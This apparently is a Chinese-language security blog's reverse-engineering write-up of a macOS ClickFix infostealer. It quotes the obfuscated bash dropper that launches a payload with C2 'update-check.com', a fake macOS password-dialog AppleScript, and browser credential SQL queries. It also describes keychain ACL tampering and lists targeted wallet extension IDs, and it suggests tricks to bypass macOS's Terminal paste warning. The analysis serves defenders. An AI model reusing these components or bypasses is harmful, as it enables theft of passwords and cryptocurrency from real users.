---
layout:     post
title:  macOS ClickFix Stealer逆向分析
subtitle:
date:       2026-04-05
author:     Closure
header-img: img/fmq.jpg
catalog: true
tags:

- 安全
---

半古法半人工))

依然是换汤不换药的clickFix社工套路搬到mac上的马，[Malwarebytes的分析文章](https://www.malwarebytes.com/blog/threat-intel/2026/03/infiniti-stealer-a-new-macos-infostealer-using-clickfix-and-python-nuitka "Malwarebytes的分析文章")里面说它的一阶段dropper用了在MacSync中见过的模板，更早的研究里这条线又和SHub联系在一起，所以研究员得出了是shared builder的结论

现在mac的clickFix设计日益完善，mac版本的操作链被改编为按Command+Space打开Spotlight→输入Terminal打开终端→粘贴恶意命令。

![ ](/img/20260405-1.png)

但是所需完成的步骤比Windows上更多，也更容易引起怀疑，因为受害者需要手动复制给定的命令粘贴到窗口中并执行，近半年做了很多改进；有页面包含嵌入式视频，向用户展示如何执行验证步骤、新自动将恶意命令复制到剪贴板、还有本篇的精确仿制 Cloudflare验证页面的外观交互

前几天刚好你果终于想起来防护这个了，虽然没有写进官方的Release Notes，但是macOS Tahoe 26.4可以检测粘贴到Terminal中的潜在危险命令，识别到此类命令时会阻止执行并在用户继续之前显示警告。

> Possible malware, Paste blocked. Your Mac has not been harmed. Scammers often encourage pasting text into Terminal to try and harm your Mac or compromise your privacy.

具体行为特征：

- 当用户从 Safari 复制潜在危险命令并尝试粘贴到 Terminal 时，macOS Tahoe 26.4 会延迟执行并显示醒目的警告对话框 Cyber Press
- 用户会看到一个主要的"Don't Paste"按钮来中止操作，以及一个次要的"Paste Anyway"选项用于合法管理任务 Cyber Press
- 该警告每个 Terminal 会话只出现一次，而不是每次粘贴都出现，以避免对有经验的开发者造成干扰 Cyber Press

但是绕过也不难.....每个会话只出现一次，可以先让用户先粘贴一条无害的命令并点击Paste Anyway，那么同一会话内后续粘贴的真正命令就不会触发警告，而且明确是当用户从Safari复制命令并粘贴时，才会显示警告，所以完全可以写个说明让用户先将命令复制到中间应用，再从那里复制粘贴到来改变剪贴板的来源标记

虽然避开命令模式匹配目前尚不明确具体哪些命令会触发警告()但是社区有用户发现粘贴无害命令不会触发，可能存在某种分析机制，如果检测基于模式匹配，攻击者完全可以对命令进行混淆和多层嵌套

### Bash dropper

![ ](/img/20260405-2.png)

五个垃圾函数全是no-op，只做了无意义计算和echo "" > /dev/null，恒返回 0，grep了这些函数名发现没有其他地方引用，真实逻辑只有脚本头尾的 mktemp → base64 -d → chmod → xattr → nohup 执行 → rm -f 自删除。

第九行是payload落盘路径

```
_230d6fce=$(mktemp /tmp/.4277777b61b2fe3fXXXXXX)
```

用mktemp在/tmp目录下创建一个隐藏的临时文件，硬编码的伪随机字符串和变量名 _230d6fce进行混淆来看起来像系统组件

```
base64 -d << '413C67D58116DA4BCFC2CD95' > "$_230d6fce"_230d6fce=$(mktemp /tmp/.4277777b61b2fe3fXXXXXX)
```

从这里开始到文件末尾出现 413C67D58116DA4BCFC2CD95的那一行，中间所有内容都是 base64编码的二进制payload

```
413C67D58116DA4BCFC2CD95
chmod +x "$_230d6fce"
xattr -dr com.apple.quarantine "$_230d6fce" 2>/dev/null

_5e86f04f="https://update-check.com/"
_f28bb0ac="a6b86a7e14fae198cde3cb90fbdf150e8542088725ca1be6088ab7bfc638354c"
BS_URL="$_5e86f04f" BS_TOKEN="$_f28bb0ac" nohup "$_230d6fce" >/dev/null 2>&1 &
sleep 5 && rm -f "$_230d6fce"
echo "Checking for updates..."
sleep 2
echo "System is up to date."
osascript -e 'tell application "Terminal" to close front window' 2>/dev/null &_230d6fce=$(mktemp /tmp/.4277777b61b2fe3fXXXXXX)
```

先通过chmod+x为解码后的二进制文件给权限，调用xattr -dr com.apple.quarantine删除 mac系统的隔离属性，来绕过Gatekeeper的安全检测，使系统将文件视为本地可信程序。

再利用环境变量BS_URL 和 BS_TOKEN直接传递C2和认证令牌，毕竟环境变量不会出现在命令行日志中，再配合nohup和输出重定向>/dev/null 2>&1，能让程序在后台运行。

为了消除痕迹还有延迟自删除，在启动5秒后立即删除磁盘上的临时文件，最后脚本通过echo模拟系统更新检查的提示信息来让受害者认为这是一次正常操作。

最末尾的一步：

```
osascript -e 'tell application "Terminal" to close front window' 2>/dev/null &
```

通过AppleScript自动关闭当前Terminal窗口，配合前面的 "System is up to date." 社工输出，让整个过程看起来就像一次正常的系统检查闪了一下就结束了

### stage2

↑ 已知是通过BS_URL / BS_TOKEN环境变量接收C2配置和内嵌了压缩 payload

![ ](/img/20260405-3.png)

如图，一个直球payload，只读权限。

iS输出里，代码段 __TEXT.__text大小0x360字节，所以这个大概率就是加载器，nCmds18，

`0x200085 (MH_NOUNDEFS | MH_DYLDLINK | MH_TWOLEVEL | MH_PIE)`

可见是一个支持ASLR的可执行文件，综上目前为止是逻辑是入口entry0 执行，代码在TEXT段，程序通过Mach-O API定位到名payload，利用那35个字符串和简单逻辑对payload数据进行处理。

![ ](/img/20260405-4.png)
跳到0x00014000验证，确实是payload段的起始。因为这是Nuitka打包的Python程序，已知特征是以ASCII KAY开头紧跟zstd压缩帧。

![ ](/img/20260405-5.png)

扔进反编译器里看看， _ZSTD_ 开头的函数密集出现，所以和之前的推断一样是Zstd算法压缩的：

- _ZSTD_findFrameSizeInfo(): 获取压缩包大小信息。
- _ZSTD_getFrameHeader_advanced(): 解析压缩帧头部。
- _ZSTD_decompressContinue(): 这是流式解压的核心，说明 Payload 是分块解压的。
- _ZSTD_decompressMultiFrame(): 处理多帧压缩数据。

代码大量使用了x19+偏移的方式来存储状态，实际上是一个Nuitka解压上下文结构体

- x19 + 0x73f8: 存储由 malloc 分配的当前解压缓冲区地址。
- x19 + 0x7418: 存储该缓冲区的结束地址（Boundary）。
- x19 + 0x7400: 存储当前的解压偏移量。
- x19 + 0x7408: 存储已处理的数据长度。

解压后的去向看观察label_21附近的逻辑：

```
x0 = x9 + x8; // 目标内存地址
x1 = x25;     // 压缩数据源
x2 = x27;     // 长度
memcpy (x0, x1, x2);
```

倾向于先在内存中进行memcpy和decompress，根据 Nuitka 的特性会将解压后的数据写入到临时目录，所以得留意间接调用....

cc写了手动脱壳器，看了一下思路是用固定的偏移特征，直接跳转到0x14000偏移处寻找KAY 签名。Loader在Payload前加了3个字节的KAY导致标准解压工具无法识别，cc写的脚本就先用data[0x14003:]切片去掉了伪装壳，还原出纯净的压缩帧头。

![ ](/img/20260405-52.png)
![ ](/img/20260405-51.png)

再用zstandard库，在不创建临时文件夹不触发销毁逻辑的前提下，将压缩包在内存中膨胀还原为34M的原始归档

### Stage 3

Stage3因为是原生ARM64机器码所以不能用常规逆向，IDA里全是cpython API调用的冗杂垃圾.....先看导出来的函数

```
"_MAKE_FUNCTION_modules\$[\x20-\x7E]{10,}" -AllMatches | ForEach-Object { $_.Matches.Value }
_MAKE_FUNCTION_modules$chromium$$$function__1__any_browser_installed
_MAKE_FUNCTION_modules$chromium$$$function__2__find_keychain
_MAKE_FUNCTION_modules$chromium$$$function__3__prompt_login_password
_MAKE_FUNCTION_modules$chromium$$$function__4__unlock_and_grant
_MAKE_FUNCTION_modules$chromium$$$function__5__ensure_keychain_unlocked
_MAKE_FUNCTION_modules$chromium$$$function__6__ctypes_find_password
_MAKE_FUNCTION_modules$chromium$$$function__7__cli_find
_MAKE_FUNCTION_modules$chromium$$$function__8_pre_unlock
_MAKE_FUNCTION_modules$chromium$$$function__9_prefetch_keychain_keys
_MAKE_FUNCTION_modules$chromium$$$function__10__get_keychain_password
_MAKE_FUNCTION_modules$chromium$$$function__11__derive_key
_MAKE_FUNCTION_modules$chromium$$$function__12__decrypt_v10
...
...

_MAKE_FUNCTION_modules$keychain_parser$$$function__11_dump_all
_MAKE_FUNCTION_modules$uploader$$$function__1__url
_MAKE_FUNCTION_modules$uploader$$$function__2_upload_json
_MAKE_FUNCTION_modules$uploader$$$function__3_upload_file
_MAKE_FUNCTION_modules$uploader$$$function__4_upload_screenshot
_MAKE_FUNCTION_modules$uploader$$$function__5_upload_extension_zip
_MAKE_FUNCTION_modules$uploader$$$function__6_upload_wallet_zip
_MAKE_FUNCTION_modules$uploader$$$function__7_upload_complete
_MAKE_FUNCTION_modules$wallets$$$function__1__zip_path
_MAKE_FUNCTION_modules$wallets$$$function__2_collect
```

望文生义，第一个是不仅读账密和cookies，还有弹出伪造的系统对话框骗取电脑登录密码的Chromium模块，第二个底层解析的Keychain Parser，内置了直接解析macOS Keychain二进制数据库的能力，第三个是全盘扫描，第四个是外传模块，区分了账密、截屏、数字货币。

然后抓一下C2，根据uploader模块的函数，它一定会读取BS_URL

```
https://nuitka.net/info/segfault.html
https://www.ibm.com/    support/knowledgecenter/en/ssw_aix_72/install/binary_compatability.html
http://speleotrove.com/decimal/decarith.html
http://en.wikipedia.org/wiki/IEEE_854-1987
https://docs.python.org/3.11/library/binascii.html#binascii.a2b_base64
http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
http://www.iana.org/time-zones/repository/tz-link.html for
http://www.w3.org/TR/NOTE-datetime
http://www.cl.cam.ac.uk/~mgk25/iso-time.html
http://www.phys.uu.nl/~vgent/calendar/isocalendar.htm
http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
https://en.wikipedia.org/wiki/Cache_replacement_policies#Least_recently_used_(LRU)
https://www.python.org/download/releases/2.3/mro/.
http://wwwsearch.sf.net/):

.....
....
http://tools.ietf.org/html/rfc6125#section-6.4.3
https://example.com/")
https://example.com/", timeout=Timeout(10))
https://example.com/", timeout=no_timeout)
http://hg.python.org/cpython/file/603b4d593758/Lib/socket.py#l535>`_.
http://hg.python.org/cpython/file/603b4d593758/Lib/socket.py#l535>`_.
https://google.com/mail/")
https://google.com/mail/"
https://username:password@host.com:80/path?query#fragment"
http://google.com/mail/'))
```

扫了一眼果然全是来自捆绑的第三方库文档()看披露报告里面是硬编码C2是 update-check.com，通过环境变量传递，然后透传环境变量，所以自身不含C2，stage3只从 BS_URL 环境变量读取存在1里面

![ ](/img/20260405-7.png)

沙箱**Select-String -Path "stage3_UpdateHelper.bin" -Pattern "sandbox|vmware|virtualbox|vbox|qemu|hybrid.analysis|any\.run"**

反沙箱这一块高度依赖环境变量来获取C2，反沙箱这里用了多维校验和动态延迟。具体来说，从Nuitka符号 `_impl___main__$$$function__2__is_sandbox` 还原出的 `_is_sandbox()` 函数（`reconstructed_source/__main__.py`）包含四层检测

**主机名黑名单**：硬编码了13项关键词：`qemu`、`sandbox`、`vmware`、`cuckoo`、`vbox`、`hybrid-analysis`、`virtualbox`、`analysis`、`joesandbox`、`malware`、`virus`、`any.run`、`xen`，对 `socket.gethostname()` 做小写匹配命中任意一项直接退出

**系统运行时间**：利用 `sysctl -n kern.boottime` 获取开机时间戳，计算 uptime，低于阈值 `_MIN_UPTIME_SECS`（具体值被编译优化无法提取）则判定为沙箱

** 进程基数**：通过 `ps ax` 统计当前进程数量，低于 `_MIN_PROCESSES` 阈值则判定为沙箱

**VM文件系统指纹**：检查以下路径是否存在：

- `/Library/Application Support/VMware Tools`
- `/Library/Application Support/VirtualBox Guest Additions`
- `/dev/vboxguest`

`analyze_stage3.py` 的第三部分 "ANTI-ANALYSIS / ANTI-SANDBOX / ANTI-VM" 也是用关键词列表在stage3二进制的字符串常量池中扫描反沙箱/反虚拟机特征来验证这些逻辑的存在。

通过沙箱检测后，还有一层动态延迟，40秒固定延迟之上叠加了 `random.randint(0, ~10)` 的随机抖动

木马会用macOS原生的system_profiler提取硬件UUID，SHA-256生成一个稳定唯一的受害者 ID。它这里还是多线程来执行高耗时操作，比如后台预取macOSKeychain和全盘扫描，在主线程中它依次收割基于Chromium和Firefox内核的浏览器Cookie和插件钱包，最后截屏。

在数据回传经典结构化和分类回传，执行完毕后发送的upload_complete信号，代码中提到的触发Telegram通知和crack queue可能是一条龙服务.....回传完毕能立即收到推送，服务端还会自动将抓取到的加密资产送入分布式的破解队列进行暴力破解

### SQL查询

```
Select-String -Path "stage3_UpdateHelper.bin" -Pattern "

_MAKE_FUNCTION_modules\$[\x20-\x7E]{10,}" -AllMatches | ForEach-Object { $_.Matches.Value }
_MAKE_FUNCTION_modules$chromium$$$function__1__any_browser_installed
_MAKE_FUNCTION_modules$chromium$$$function__2__find_keychain
_MAKE_FUNCTION_modules$chromium$$$function__3__prompt_login_password
_MAKE_FUNCTION_modules$chromium$$$function__4__unlock_and_grant
_MAKE_FUNCTION_modules$chromium$$$function__5__ensure_keychain_unlocked
_MAKE_FUNCTION_modules$chromium$$$function__6__ctypes_find_password
_MAKE_FUNCTION_modules$chromium$$$function__7__cli_find
_MAKE_FUNCTION_modules$chromium$$$function__8_pre_unlock
_MAKE_FUNCTION_modules$chromium$$$function__9_prefetch_keychain_keys
_MAKE_FUNCTION_modules$chromium$$$function__10__get_keychain_password
_MAKE_FUNCTION_modules$chromium$$$function__11__derive_key
_MAKE_FUNCTION_modules$chromium$$$function__12__decrypt_v10
_MAKE_FUNCTION_modules$chromium$$$function__13__get_profiles
_MAKE_FUNCTION_modules$chromium$$$function__14__read_logins
_MAKE_FUNCTION_modules$chromium$$$function__15__read_cookies
_MAKE_FUNCTION_modules$chromium$$$function__16_collect
_MAKE_FUNCTION_modules$chromium$$$function__6__ctypes_find_password$$$function__1__find
_MAKE_FUNCTION_modules$extensions$$$function__1__copy_ldb_to_tmp
_MAKE_FUNCTION_modules$extensions$$$function__2__zip_extension
_MAKE_FUNCTION_modules$extensions$$$function__3_collect
_MAKE_FUNCTION_modules$file_secrets$$$function__1__is_binary
_MAKE_FUNCTION_modules$file_secrets$$$function__2__truncate
_MAKE_FUNCTION_modules$file_secrets$$$function__3__should_scan
_MAKE_FUNCTION_modules$file_secrets$$$function__4__scan_file
_MAKE_FUNCTION_modules$file_secrets$$$function__5__dlog
_MAKE_FUNCTION_modules$file_secrets$$$function__6__scan_dir
_MAKE_FUNCTION_modules$file_secrets$$$function__7_collect
_MAKE_FUNCTION_modules$firefox$$$function__1__load_nss
_MAKE_FUNCTION_modules$firefox$$$function__2__shutdown_nss
_MAKE_FUNCTION_modules$firefox$$$function__3__decrypt_nss
_MAKE_FUNCTION_modules$firefox$$$function__4__find_profiles
_MAKE_FUNCTION_modules$firefox$$$function__5__read_logins_json
_MAKE_FUNCTION_modules$firefox$$$function__6_collect
_MAKE_FUNCTION_modules$keychain_parser$$$function__1__u32
_MAKE_FUNCTION_modules$keychain_parser$$$function__2__safe_str
_MAKE_FUNCTION_modules$keychain_parser$$$function__3___init__
_MAKE_FUNCTION_modules$keychain_parser$$$function__4_is_valid
_MAKE_FUNCTION_modules$keychain_parser$$$function__5__auth_off
_MAKE_FUNCTION_modules$keychain_parser$$$function__6__db_off
_MAKE_FUNCTION_modules$keychain_parser$$$function__7_derive_master_key
_MAKE_FUNCTION_modules$keychain_parser$$$function__8_generic_passwords
_MAKE_FUNCTION_modules$keychain_parser$$$function__9__parse_record
_MAKE_FUNCTION_modules$keychain_parser$$$function__10_find_generic_password
_MAKE_FUNCTION_modules$keychain_parser$$$function__11_dump_all
_MAKE_FUNCTION_modules$uploader$$$function__1__url
_MAKE_FUNCTION_modules$uploader$$$function__2_upload_json
_MAKE_FUNCTION_modules$uploader$$$function__3_upload_file
_MAKE_FUNCTION_modules$uploader$$$function__4_upload_screenshot
_MAKE_FUNCTION_modules$uploader$$$function__5_upload_extension_zip
_MAKE_FUNCTION_modules$uploader$$$function__6_upload_wallet_zip
_MAKE_FUNCTION_modules$uploader$$$function__7_upload_complete
_MAKE_FUNCTION_modules$wallets$$$function__1__zip_path
_MAKE_FUNCTION_modules$wallets$$$function__2_collect
```

搜索SELECT开头的字符串，因为SELECT这个词也出现在Nuitka编译器生成的大量符号名中，所以实际匹配到的远不止语句，还把整个 Nuitka符号表都拉了出来，~~这里意外获得了完整的函数名清单和模块结构(~~

从常量池中提取到两条SQL查询：

```
SELECT origin_url, username_value, password_value
FROM logins
  WHERE blacklisted_by_user = 0
```

目标文件是Login Data，blacklisted_by_user = 0 过滤掉用户手动标记为不保存的条目，提取字段映射 origin_url → url, username_value → username, password_value是需解密的密文

```
Cookie 查询

  SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly
  FROM cookies
  LIMIT 2000
```

代码对mac钥匙串有自己的策略，安全对话框可能引起用户警觉，所以在文件运行的前1秒内立刻启动预取线程执行 _cli_find()，这个时候弹出SecurityAgent对话框会被用户误认为是刚刚运行的程序的正常启动行为。

进入_ctypes_find_password流程的时候会直接调用底层C API，通过 SecKeychainSetUserInteractionAllowed(false) 强行静默所有系统提示，如果读取请求被ACL阻止，甚至会调用SecAccessCreate配合SecKeychainItemSetAccess篡改ACL规则，强制修改为允许所有应用访问。操作完成后还会调用 `SecKeychainSetUserInteractionAllowed(True)` 恢复对话框的正常弹出。

↑属于是这是一个反取证，后续合法进程访问Keychain时对话框正常出现

这个马对Keychain设计了两条并行的攻击路径互为fallback，第一条是通过 `subprocess.run(["security", ...])` 调用命令行工具，先 `security unlock-keychain -p` 解锁再用 `security set-generic-password-partition-list -S "apple-tool:,apple:"` 篡改ACL的partition list，使 `/usr/bin/security` 和Apple签名工具获得读取权限，但这条路径每次调用都产生新的子进程，EDR可以通过execve事件捕获完整命令行参数包括明文密码。

第二条就是上面说的ctypes直接调用Security.framework的C API，全部操作在当前Python进程地址空间内完成，不产生子进程、不调用 `/usr/bin/security`、不出现在 `ps aux` 中。优先走ctypes失败再回退命令行。

### 钱包目录

浏览器扩展钱包：MetaMask, Phantom, Coinbase Wallet, Trust Wallet, Tonkeeper, Solflare, TronLink, Binance Wallet,Exodus Web3, OKX Wallet, Bitget Wallet, Backpack, Rabby, Keplr, Brave Wallet, Nami (Cardano), MyEtherWallet, Enkrypt,Petra (Aptos), XDEFI, Ronin Wallet, Math Wallet

桌面钱包目录：Exodus (wallet + backups), Electrum, Bitcoin Core, Coinomi, Wasabi Wallet, Sparrow, Specter, Trust Wallet desktop, Trezor Suite, MetaMask Flask

#### 假弹窗

上面说了有假弹窗，看一下逻辑

**Select-String -Path 'stage3_UpdateHelper.bin' -Pattern 'display dialog[\x20-\x7E]{20,}' -AllMatches**

![ ](/img/20260405-9.png)

`set p to text returned of (display dialog "macOS needs your password to allow this action." with title "macOS" default answer "" with hidden answer buttons {"Cancel", "OK"} default button "OK" with icon 1)  return p`

调用osascript -e来执行，弹出一个官方的系统权限对话框，来骗取用户输入的密码。标题栏是完全模仿真实的系统权限请求，顺便对话框用with hidden answer参数将输入内容以圆点形式遮罩显示，来模拟输入框的标准行为(((通过with icon 1参数调用系统标准的警告图标，不是我之前写东西里面的自定义图标

恶意代码通过Python的subprocess.run(["osascript", "-e", APPLESCRIPT], capture_output=True, timeout=...)执行这段AppleScript

### 钱包映射

这个马是直接窃取扩展的LevelDB 本地存储

`<profile>/Local Extension Settings/<extension_id>/`

![ ](/img/20260405-6.png)

目录包含扩展的IndexedDB/LevelDB数据库，其中存储了加密的私钥、助记词的加密副本
、账户元数据，代码将整个目录打包上传到C2由服务端的crack queue尝试离线破解。

还原之后:

```
1. MetaMask | nkbihfbeogaeaoehlefnkodbefgpgknn | EVM (ETH/BSC/Polygon...)
2. Phantom | bfnaelmomeimhlpmgjnjophhpkkoljpa | Solana / EVM
3. Coinbase Wallet | hnfanknocfeofbddgcijnmhnfnkdnaad | EVM / Solana
4. Trust Wallet | egjidjbpglichdcondbcbdnbeeppgdph | 多链
5. Tonkeeper | omaabbefbmiijedngplfjmnooppbclkk | TON
6. Solflare | bhhhlbepdkbapadjdnnojkbgioiodbic | Solana
7. TronLink | ibnejdfjmmkpcnlpebklmnkoeoihofec | Tron
8. Binance Wallet | fhbohimaelbohpjbbldcngcnapndodjp | BNB Chain
9. Exodus Web3 | aholpfdialjgjfhomihkjbmgjidlcdno | 多链
10. OKX Wallet | mcohilncbfahbmgdjkbpemcciiolgcge | 多链
11. Bitget Wallet | jiidiaalihmmhdlpnkpbbfabenbcdnef | 多链
12. Backpack | aflkmfhebedbjioipglgcbcmnbpgliof | Solana / EVM
13. Rabby | acmacodkjbdgmoleebolmdjonilkdbch | EVM
14. Keplr | dmkamcknogkgcdfhhbddcghachkejeap | Cosmos
15. Brave Wallet | odbfpeeihdkbihmopkbjmoonfanlbfcl | EVM
16. Nami | lpfcbjknijpeeillifnkikgncikgfhdo | Cardano
17. MyEtherWallet | nlbmnnijcnlegkjjpcfjclmcfggfefdm | EVM
18. Enkrypt | kkpllkodjeloidieedojogacfhpaihoh | 多链
19. Petra | mgffkfbidihjpoaomajlbgchddlicgpn | Aptos
20. XDEFI | blnieiiffboillknjnepogjhkgnoapac | 多链
21. Ronin Wallet | fnjhmkhhmkbjkkabndcnnogagogbneec | Ronin (Axie Infinity)
22. Math Wallet | ejjladinnckdgjemofnlljpkijjjmopf | 多链
```

#### 窃取流程

1. 对每个已安装的 Chromium 浏览器
2. 对每个 Profile (Default, Profile 1, Profile 2...)
3. 对每个目标扩展 ID (22个):检查 <profile>/Extensions/<ext_id>/ 是否存在，如果存在复制 Local Extension Settings/<ext_id>/*.ldb 到临时目录(复制是为了绕过 Chrome 对 LDB 文件的 advisory lock)
4. 打包为 ZIP

所以可以把那串32位ID拆开和钱包名对应，搞个扩展ID映射表。

Chrome扩展ID的格式是固定的，都是32个小写字母[a-p]（但是实际是公钥的base16编码，只用a-p

在Nuitka的常量池中WALLET_EXTENSIONS字典的ID和钱包名是按顺序紧邻存储的，之前的提取已经看到钱包名列表的顺序，所以只要按相同顺序提取ID就能建立映射

### strip

有个挺出乎意料的疏漏，攻击者用Nuitka将Python源码编译原生Mach-O ARM64，目的是阻止反编译和将依赖打包为单文件，以及看起来像原生C程序，但是它最大疏忽在于没有strip符号表。。。

Stage1和Stage 2能看出来攻击者是有意识地在投递阶段制造分析摩擦的，但是Stage3提取完之后，分析脚本对二进制执行全量字符串提取，然后通过Nuitka特有的符号命名模式进行模块和函数还原，Nuitka编译器为每个函数生成形如`_MAKE_FUNCTION_<module>$$$function__<N>_<name>` 的符号，为每个模块级变量生成 `_module_var_accessor_<module>$_<var_name>` 的符号←这些符号在未 strip 的二进制中完全可读：

```
all_strings = []
for m in re.finditer(rb'[\x20-\x7e]{4,}', data):
all_strings.append((m.start(), m.group().decode('ascii', errors='replace')))

```
modules = defaultdict(list)
for off, s in all_strings:
    m = re.search(r'modules\$([\w.]+)\$\$\$function.*?_(\w+)', s)
    if m:
        mod = m.group(1).replace('$', '.')
        func = m.group(2)
        modules[mod].append(func)
        continue
    m = re.search(r'_MAKE_FUNCTION_([\w.]+)\$\$\$function.*?_(\w+)', s)
    if m:
        mod = m.group(1).replace('$', '.')
        func = m.group(2)
        modules[mod].append(func)
```

一步就还原出了完整的模块清单及其函数列表.......这个样本用的最基础的做法是仅用Nuitka编译，不做任何strip处理，所以只靠纯文本就可以还原模块结构、函数名、变量名以及所有常量，其实ida和cutter都用不着上

- `modules.chromium`（浏览器凭据窃取）
- `modules.firefox`（Firefox 凭据窃取）
- `modules.extensions`（钱包扩展窃取
- `modules.wallets`（桌面钱包窃取）
- `modules.file_secrets`（文件密钥扫描）
- `modules.screenshot`（屏幕截图)
- `modules.uploader`（数据外传）
- `modules.config`（C2 配置读取）
- main模块中的函数名：`_is_sandbox`、`_hw_uuid`、`_make_victim_id`、`run`、`_log`、`_run_prefetch`、`_run_file_secrets`。

如果在↑基础上加上strip，虽然函数名和变量名会被剥离，但是常量池中的字符串依然完整保留。 Nuitka默认还会保留 `_module_var_accessor_` 和 `_impl_` 前缀的内部实现符号。

源码中的所有字符串常量，SQL查询语句、正则表达式、文件路径、浏览器扩展ID、钱包名、AppleScript代码、C2环境变量名，全部被原封不动地序列化到二进制的常量池中。所以即使执行了strip，分析者仍然可以通过常量池中的字符串还原出程序的完整行为，进一步如果叠加字符串混淆，就需要上动态分析了，在运行时hook解密函数才能获取明文难度会更大



